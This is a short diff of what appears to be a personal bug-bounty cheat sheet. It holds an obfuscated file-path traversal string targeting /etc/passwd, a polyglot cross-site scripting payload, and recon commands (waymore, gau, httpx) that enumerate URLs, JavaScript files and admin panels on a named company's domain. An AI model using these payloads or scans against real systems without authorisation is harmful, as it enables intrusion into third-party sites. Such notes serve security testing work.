@@ -11,7 +11,8 @@ file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
 
 JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
 
-waymore -i northwesternmutual.com -mode U -xcc -c ~/.config.yml -oU ~/.config/waymore/results
+waymore -i northwesternmutual.com -mode U -xcc -c ~/.config.yml -oU 
+cd ~/.config/waymore/results
 gau -subs northwesternmutual.com |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
 cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
 
